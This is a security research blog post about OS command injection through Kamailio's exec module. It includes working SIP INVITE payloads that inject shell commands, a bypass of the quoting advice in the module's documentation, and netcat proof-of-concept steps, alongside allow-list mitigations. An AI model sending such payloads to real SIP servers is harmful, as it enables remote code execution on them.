---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-26_kamailios-exec-module-considered-harmful.md
original_filename: 2023-01-26_kamailios-exec-module-considered-harmful.md
title: Kamailio’s exec module considered harmful
category: documents
detected_topics:
- command-injection
- sso
- automation-abuse
- information-disclosure
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- sso
- automation-abuse
- information-disclosure
- api-security
- supply-chain
language: en
raw_sha256: df825ab4dc460d11aa036c5fe1db320a0116fd5274086560882d515e9df5d9bb
text_sha256: 4358ac853f2b8bfae26345a84fb4e31938b7516af7ce7046e270f0b0e3ceeee6
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Kamailio’s exec module considered harmful

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-26_kamailios-exec-module-considered-harmful.md
- Source Type: markdown
- Detected Topics: command-injection, sso, automation-abuse, information-disclosure, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `df825ab4dc460d11aa036c5fe1db320a0116fd5274086560882d515e9df5d9bb`
- Text SHA256: `4358ac853f2b8bfae26345a84fb4e31938b7516af7ce7046e270f0b0e3ceeee6`


## Content

---
title: "Kamailio’s exec module considered harmful"
page_title: "Kamailio's exec module considered harmful – Enable Security"
url: "https://www.rtcsec.com/article/kamailio-exec-module-considered-harmful/"
final_url: "https://www.enablesecurity.com/blog/kamailio-exec-module-considered-harmful/"
authors: ["Ali Norouzi", "Sandro Gauci (@sandrogauci)"]
programs: ["Kamailio"]
bugs: ["OS command injection", "SIP"]
publication_date: "2023-01-26"
added_date: "2023-01-31"
source: "pentester.land/writeups.json"
original_index: 1624
---

![Sandro Gauci](https://www.enablesecurity.com/assets/img/sandro-thumb_hu_f1b0822e4d5c5b22.jpg)

**Sandro Gauci**, Enable Security

# Kamailio’s exec module considered harmful

Published on Jan 26, 2023 in _[kamailio](/tags/kamailio/)_ , _[research](/tags/research/)_

## Executive summary (TL;DR)

  * The combination of pseudo-variables and Kamailio’s exec can be risky and may result in code injection.
  * By using special SIP headers and environment variables, it becomes effortless to exploit a vulnerable configuration.
  * We have created a Docker environment to assist readers in reproducing this vulnerability and testing solutions.
  * Protection is tricky and the official documentation may have previously misled developers - we aim to fix that by updating the module’s official documentation.
  * Kamailio configurations should use a strict allow list or avoid the module altogether.

## Introduction to Kamailio’s exec module and its capabilities

The Kamailio SIP server ships with a module for executing external commands from within a Kamailio configuration. The topic of this article is how the exec module may be misused to lead to remote code execution vulnerabilities. The default Kamailio configuration, which is used as a starting point for many live installations, **does not** make use of this module. On the other hand, we have seen this module being used in various production environments and have, in the past, found some of these installations to be vulnerable.

To make use of this module, you must first include it in the Kamailio configuration as follows:
  
  
  loadmodule "exec.so"
  

After that you will be able to use the exposed functions which include the following:

  * `exec_dset`: _Executes an external command. The current URI is passed to the command as a parameter._
  * `exec_msg`: _Executes an external command. The whole SIP message is passed to standard input._
  * `exec_avp`: _Executes an external command. Each line from the output of the command is saved in an AVP from ‘`avplist`’._
  * `exec_cmd`: _Executes an external command. It is a lightweight version without the extra functionality provided by the previous 3 functions._

By taking a look at the Kamailio [`exec` module examples](https://kamailio.org/docs/modules/5.6.x/modules/exec.html#exec.f.exec_dset) for the `exec_dset` function, we find the following snippet:
  
  
  exec_dset("echo TEST > /tmp/test.txt");
  exec_dset("echo TEST > /tmp/$rU.txt");
  

Since this first example in the official documentation includes usage of the Kamailio pseudo-variables (i.e. `$rU`), the documentation appears to encourage such patterns. The example shows how to make use of the said module to create a file in the `/tmp` directory where the filename relies on the [`$rU` pseudo-variable](https://www.kamailio.org/wiki/cookbooks/devel/pseudovariables#ru_-_username_in_r-uri). This variable expands to the username in R-URI in an incoming SIP message. However, the example has a slight mistake since Kamailio will look for a non-existent `$rU.txt` variable instead of the expected `$rU`. In fact, this generates the following error in Kamailio:
  
  
  pv_parse_spec2(): error searching pvar "rU.txt"
  

We could simply remove the `.txt` from the sample code. If we insist on having a `.txt` file extension, we can use the following syntax:
  
  
  exec_dset("echo TEST >> /tmp/$(rU).txt");
  

As we will see in the following sections, this may be a recipe for disaster. Let’s dive in.

## Security concerns and vulnerabilities

Including pseudo-variables within Kamailio’s exec functions is a crime that any developer can commit. The problem is that many of these pseudo-variables are user-controlled and are set in the SIP message that is currently being processed. This exposes the configuration to OS command injection which is a subset of the code injection vulnerability class. A remote attacker may trigger this vulnerability by simply sending a malicious SIP message. To exploit this vulnerability, in the case of `$rU`, we need to format an OS command in a way that the shell understands and include that instead of the username within a request URI. This may be done by making use of backticks or the `$(...)` syntax. The following example makes use of the backtick syntax, and shows how the `whoami` command is included in a SIP message:
  
  
  INVITE sip:`whoami`@127.0.0.1 SIP/2.0
  Via: SIP/2.0/UDP 127.0.0.1:33119;rport;branch=z9hG4bK-tkTnlLt9O060cG74
  Max-Forwards: 70
  From: <sip:10259236@127.0.0.1>;tag=iGisWG0cKQ7TyixA
  To: <sip:1000@127.0.0.1>
  Call-ID: vnU9zwgVVsPsOLzc
  CSeq: 1 INVITE
  Contact: <sip:10259236@127.0.0.1:33119;transport=udp>
  Content-Length: 0
  

When the above SIP request is sent to a Kamailio instance that uses the example in the documentation, Kamailio will execute the following command in a shell context:
  
  
  echo TEST >> /tmp/`whoami`.txt
  

When this executes successfully, we would be able to find a filename with the output of the `whoami` command in the `tmp` directory. Note that both ``whoami`` and `$(whoami)` are known to work.

We have prepared a repository which contains vulnerable configuration examples and also a Dockerfile for Kamailio v5.6.3, which is available at: <https://github.com/EnableSecurity/kamailio-exec-module-examples>.

In most cases, as an attacker, you will want to pass arguments to the executed commands to do anything useful. This means that you will need to insert a space between the command and the arguments. However, when you try to do that in the above SIP message, you’ll notice that SIP usernames with spaces do not comply with the SIP protocol format and it will fail to execute. When we tried to make use of URI encoding (e.g. `%20` for spaces), the value of `$rU` simply included the encoded value which stopped exploitation. But this is no time to give up! After a bit of research, we realized that we can have spaces by using a simple trick: `${IFS}`. This shell variable stands _Internal Field Separator_ and gives us our much loved space character. Therefore we could now modify our command to the following:
  
  
  $(touch${IFS}/tmp/pwned;)
  

Here is a full example of the resulting SIP message:
  
  
  INVITE sip:$(touch${IFS}/tmp/pwned;)@127.0.0.1 SIP/2.0
  Via: SIP/2.0/UDP 127.0.0.1:33119;rport;branch=z9hG4bK-tkTnlLt9O060cG74
  Max-Forwards: 70
  From: <sip:10259236@127.0.0.1>;tag=iGisWG0cKQ7TyixA
  To: <sip:1000@127.0.0.1>
  Call-ID: vnU9zwgVVsPsOLzc
  CSeq: 1 INVITE
  Contact: <sip:10259236@127.0.0.1:33119;transport=udp>
  Content-Length: 0
  

When it comes to exploitation, this provides us with a quick fix. However, with this technique, the injected command can quickly start to look very ugly. Instead, a cleaner technique is actually available when the `setvars` parameter is enabled. Luckily for us, this is enabled by default and in such cases, the exec module generates environment variables for each header. Therefore we can add a header called `Command` which contains our command, and call that by using either `$($SIP_HF_COMMAND)` or ``$SIP_HF_COMMAND``. The following is an example of the resulting SIP message:
  
  
  INVITE sip:$($SIP_HF_COMMAND)@127.0.0.1 SIP/2.0
  Command: touch /tmp/pwned_again
  Via: SIP/2.0/UDP 127.0.0.1:33119;rport;branch=z9hG4bK-tkTnlLt9O060cG74
  Max-Forwards: 70
  From: <sip:10259236@127.0.0.1>;tag=iGisWG0cKQ7TyixA
  To: <sip:1000@127.0.0.1>
  Call-ID: vnU9zwgVVsPsOLzc
  CSeq: 1 INVITE
  Contact: <sip:10259236@127.0.0.1:33119;transport=udp>
  Content-Length: 0
  

The [documentation](https://kamailio.org/docs/modules/5.6.x/modules/exec.html#exec.overview) states the following about the `SIP_HF` environment variables:

> `SIP_HF_<hf_name>` contains value of each header field in request. If a header field occurred multiple times, values are concatenated and comma-separated. <hf_name> is in capital letters.

## Recommendations for mitigating security risks associated with the exec module

### Protection that fails: making use of quotes

To protect against _bash special characters_ , [the module documentation](https://kamailio.org/docs/modules/5.6.x/modules/exec.html#exec.f.exec_msg) advises users as below:

> WARNING: if the var you are passing out has a bash special character in it, the var needs to be placed inside quotes, for example: `exec_dset("print-contact.sh '$ct'");`

Unfortunately this advice does not effectively protect against the actual attacks that we are describing. To bypass the protection given in the example, we can put the injected command in single quotes just like the following example:
  
  
  INVITE sip:'`$SIP_HF_COMMAND`'@127.0.0.1 SIP/2.0
  Command: touch /tmp/pwned_pwned_pwned
  ...
  

The example made use of a single quote. If a double quote is used instead, this has no effect and the original payload would still work just fine.

### Protection that fails: Sanity module

We ran the same test with the [sanity module](https://kamailio.org/docs/modules/5.6.x/modules/sanity.html) enabled, and it did not detect any problem in our requests. We made use of the following snippet when performing this test:
  
  
  if(!sanity_check("32767", "15")) {
  xlog("Malformed SIP message from $si:$sp\n");
  exit;
  }
  

As you can see above, the `sanity_check` function is run with the strictest mode for both `msg_checks` and `uri_checks` by switching on all possible restraints. Our new [repository with the examples](https://github.com/EnableSecurity/kamailio-exec-module-examples) includes this in the configuration too.

### Protection that works: abstinence

There are good reasons to make use of the exec module but in most cases, developers should probably avoid using this module. Often, it is not considered efficient and can easily introduce the vulnerabilities that we have described in this article. Instead, you may use other methods to achieve the same functionality that you might want to implement, in a cleaner way.

### Protection that works: regular expressions

One of the best ways to protect against this issue is to validate user-controllable input using regular expression matching. For this reason we can use [the built-in regular expression feature](https://www.kamailio.org/wiki/cookbooks/devel/core#if) in Kamailio.

The most effective way is an allow list approach to specify valid formats and block invalid values which are not matching that format. In the following example we expect the R-URI username to consist of up to 15 digits only:
  
  
  if !($rU =~ "^[0-9]{1,15}$") {
  xlog("Malformed R-URI username: '$rU'\n");
  exit;
  }
  

Note that we need to use the strict `^` and `$` symbols to make sure that we validate the whole input from start to end.

## Reproduce this on Docker containers

You can easily reproduce the issue by cloning [the accompanying repository with the examples](https://github.com/EnableSecurity/kamailio-exec-module-examples). We have provided a Kamailio Docker instance that can be configured using the vulnerable configuration as well as the one that is protected using the allow list approach.

Here are the instructions to reproduce the issues using netcat:

  1. Start the Kamailio Docker instance with the vulnerable configuration:
  
  docker-compose run kamailio-vulnerable
  

  2. Start monitoring the `/tmp` directory:
  
  docker-compose exec kamailio-vulnerable watch ls -alh /tmp
  

  3. To run the PoC use the following instruction:
  
  cat poc.txt | nc 127.0.0.1 5060
  

  4. Observe the result in the directory listing

This vulnerability may also be reproduced using SIPVicious PRO (an internal tool used by Enable Security; not sold or licensed). With the stable version of SIPVicious PRO, one may use the [repeater tool](https://docs.sipvicious.pro/stable/cui-reference/sip/utils/repeater/) to reproduce this issue as follows:

  1. Start the Kamailio Docker instance with the vulnerable configuration:
  
  docker-compose run kamailio-vulnerable
  

  2. Save the following template with the file named `inviterequest.tpl` or switch to the `svpro` directory in the repository which already has a copy:
  
  INVITE sip:`$SIP_HF_COMMAND`@127.0.0.1 SIP/2.0
  Command: {{ ENV "COMMAND" }}
  Via: SIP/2.0/{{.AddrFamily}} {{.LocalAddr}};rport;branch=z9hG4bK-{{.Branch}}
  Max-Forwards: 70
  From: {{.FromVal}}
  To: {{.ToVal}}
  Call-ID: {{.CallID}}
  CSeq: {{.CSeq}} INVITE
  Contact: {{.ContactVal}}
  Content-Length: {{.Body | len}}
  Content-Type: application/sdp
  
  {{.Body -}}
  

  3. Start monitoring the `/tmp` directory:
  
  docker-compose exec kamailio-vulnerable watch ls -alh /tmp
  

  4. Run the PoC as follows:
  
  COMMAND="touch /tmp/pwned" sipvicious sip utils repeater udp://127.0.0.1:5060 -m invite
  

  5. Observe the result in the directory listing

You may also make use of a new experimental tool called _iterator_ which can act like a scanner or fuzzer to identify this vulnerability semi-automatically.

## Is OpenSIPS exposed to the same security vulnerabilities?

This article focuses on Kamailio and we have not tested OpenSIPS while working on this post. Additionally, since OpenSIPS version 3.0, the exec module has changed significantly. Of course, similar patterns in an OpenSIPS configuration might expose your server to the same vulnerabilities described here. One major caveat is that OpenSIPS **before** version 3.0 has the same functions as Kamailio and we suspect that many of the things that we describe here do apply directly to older versions of OpenSIPS. We are planning to release a separate blog post focused on OpenSIPS so [subscribe to our newsletter and blog updates](/subscribe/).

## Conclusion

Kamailio’s exec module vulnerabilities are some of the most obvious ones that may affect a Kamailio server. It is the simplest way to achieve remote code execution in the software when it is configured improperly. Bear in mind that the examples given in this article are quite basic and might not reflect what you would see in a normal Kamailio configuration.

Often, rather than utilizing attacker-controlled variables in an exec function, user input is extracted from pseudo-variables and then passed to the exec functions. This makes it more challenging to identify this vulnerability. Despite this, in our experience, we have found these functions to be misused, and we were able to exploit them during our [penetration tests and security audits](https://www.enablesecurity.com/penetration-testing/).

In fact, a simple search online reveals Kamailio example configuration files that might be vulnerable. For instance, the [examples](https://github.com/kamailio/kamailio/tree/master/misc/examples/exec) supplied with the Kamailio package for over 20 years are also examples of insecure patterns. Therefore, we strongly recommend that you review any Kamailio configuration files and determine if and how functions from the exec module are used. To prevent potential OS command injection vulnerabilities, avoiding this module might be the best defence. However, if a quick solution is needed, safe usage requires strict input validation on user-controlled values.

Lastly, it is worth mentioning that while working on this article, we submitted a [pull request](https://github.com/kamailio/kamailio/pull/3338/) to update the Kamailio exec module with a warning to improve the documentation. We hope that this assists developers in using the Kamailio Exec module securely.

#### Subscribe to Updates

Stay updated with our latest security insights and updates.

Monthly RTCSec Newsletter

Blog Notifications

We hate spam and are committed to protecting and respecting your privacy. You can unsubscribe from our communications at any time. By subscribing, you are agreeing to the [Privacy Policy](/privacy/).

* * *

![Sandro Gauci](https://www.enablesecurity.com/assets/img/sandro-thumb_hu_d4528d812320cb98.jpg)

Sandro Gauci

[ __](https://www.linkedin.com/in/sandrogauci)[__](https://twitter.com/sandrogauci)[__](https://savvycal.com/sandrogauci/pub)CEO, Chief Mischief Officer at Enable Security

Sandro Gauci leads the operations and research at [Enable Security](https://www.enablesecurity.com). He is the original developer of [SIPVicious OSS](https://www.enablesecurity.com/sipvicious/), the SIP security testing toolset. His role is to focus on the vision of the company, design offensive security tools and engage in security research and testing. Therefore, he is the proud owner of the title of _Chief Mischief Officer_ at Enable Security.

He offers public office hours and is reachable [here](https://savvycal.com/sandrogauci/pub).

###### Contents

  * Executive summary (TL;DR)
  * Introduction to Kamailio’s exec module and its capabilities
  * Security concerns and vulnerabilities
  * Recommendations for mitigating security risks associated with the exec module
  * Protection that fails: making use of quotes
  * Protection that fails: Sanity module
  * Protection that works: abstinence
  * Protection that works: regular expressions
  * Reproduce this on Docker containers
  * Is OpenSIPS exposed to the same security vulnerabilities?
  * Conclusion
